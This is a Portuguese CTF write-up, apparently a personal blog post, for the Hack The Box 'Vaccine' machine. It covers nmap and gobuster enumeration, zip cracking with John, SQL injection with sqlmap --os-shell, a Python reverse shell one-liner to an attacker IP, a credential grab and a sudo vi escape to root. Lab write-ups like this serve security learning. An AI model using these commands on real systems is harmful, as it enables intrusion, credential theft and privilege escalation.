---
description: CTF do Hack The Box como fiz e anotações.
title: HackTheBox - Vaccine - Fácil
date: 2024-01-14 04:22:00 +/-0300
categories: [CTF, HackTheBox]
tags: [ctf, hackthebox, linux, sudo, web, facil, sqli, walk]     # TAG names should always be lowercase
show_image_post: true
---
![logo](/assets/img/vaccinelogo.png){: w="100" h="100" .left}

---
# **CTF - HTB Vaccine - Fácil**
---
---
## **Enumeração**

### nmap

```shell
sudo nmap -sS -Pn -n --disable-arp-ping --stats-every=7s -sC 10.129.254.54 -T4 -p 21,22,80 --min-rate 10000 -oA nmap 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-12 04:31 EST
Nmap scan report for 10.129.254.54
Host is up (0.15s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.151
|      Logged in as ftpuser
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
22/tcp open  ssh
| ssh-hostkey: 
|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
80/tcp open  http
|_http-title: MegaCorp Login
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set

```
{: .nolineno }
### gobuster

```shell
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://10.129.254.54/.htpasswd            (Status: 403) [Size: 278]
http://10.129.254.54/.htaccess.old        (Status: 403) [Size: 278]
http://10.129.254.54/.htpasswd.old        (Status: 403) [Size: 278]
http://10.129.254.54/.htpasswd.txt        (Status: 403) [Size: 278]
http://10.129.254.54/.htpasswd.php        (Status: 403) [Size: 278]
http://10.129.254.54/.htaccess.php        (Status: 403) [Size: 278]
http://10.129.254.54/.htaccess.txt        (Status: 403) [Size: 278]
http://10.129.254.54/.htaccess            (Status: 403) [Size: 278]
http://10.129.254.54/dashboard.php        (Status: 200) [Size: 2312]
http://10.129.254.54/index.php            (Status: 200) [Size: 2312]
http://10.129.254.54/license.txt          (Status: 200) [Size: 1100]
http://10.129.254.54/server-status        (Status: 403) [Size: 278]
Progress: 81876 / 81880 (100.00%)
===============================================================
```
{: .nolineno }

A pagina inicial é uma tela de login.  
O ftp permite login anonymous, encontrando backup.zip com senha -> "741852963", resolvida com John The Ripper.

``
$zip2john backup.zip > hash  
``  
``
$john hash
``

Dentro do zip foi encontrado:
index.php
onde contem login e senha.

```php
admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") 
```
{: .nolineno }

Hash "2cb42f8734ea607eefed3b70af13bbd3" = "qwerty789".  
Obtida em banco de dados de algum site.  
login e senha aceitos na pagina inicial;

Pagina Web vulnerável a SQLInjection.

![sqli](/assets/img/vaccine1.png)

## **Acesso**

### Reverse Shell

Com sqlmap foi possível confirmar e ler o db, nada de util, porem existe a opção ``--os-shell``
que você pode executar um comando, no caso vamos usar para executar uma reverse shell.

`sqlmap -u 'http://10.129.254.54/dashboard.php?search=a' --cookie="PHPSESSID=pt0gp6cl43a3lvq63atkn90j7b" --os-shell`

o `--cookie` é necessário para manter a sessão

comando de reverse shell executado

python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.151",4443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")'

Shell Upgrade

```shell
python3 -c 'import pty;pty.spawn("/bin/bash")'  
CTRL+Z  
stty raw -echo  
fg  
export TERM=xterm  
```
{: .nolineno }

## **Obtendo credenciais**

Pegando a senha do db em: cat  /var/www/html/dashboard.php  
`user=postgres password=P@s5w0rd!"`

A shell cai e poucos minutos e com essa senha podemos logar via ssh.

### Primeira flag

`cat user.txt`  
`ec9b13ca4d6229cd5cc1e09980965bf7`  

## **Escalação de Privilégio**  

Agora podemos executar o sudo -l  e ver algum possível escalamento de privilégio.  

```shell
$sudo -l
User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```
  {: .nolineno }

  Consultando o  [GTO](https://gtfobins.github.io/gtfobins/vi/#sudo) ele nos da essa opção
  
`sudo vi -c ':!/bin/sh' /dev/null`
   
```shell
postgres@vaccine:~$ sudo vi -c ':!/bin/sh' /dev/null
Sorry, user postgres is not allowed to execute '/usr/bin/vi -c :!/bin/sh /dev/null' as root on vaccine.
```
{: .nolineno }

Só podemos usar o vi em `etc/postgresql/11/main/pg_hba.conf`,
  a alternativa que o GTO nos da é:
  
`vi`  
`:set shell=/bin/sh`  
`:shell`

sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
usamos:  
`:`  
`set shell=/bin/sh`  
`[enter]`   
`:`  
`shell`  
`[enter]`  

### Ultima flag
```shell
$whoami  
root
$root@vaccine:~# cat root.txt 
dd6e058e814260bc70e9bbdef2715849
$root@vaccine:~# 
```
{: .nolineno }
![pwned](/assets/img/vaccine3.png)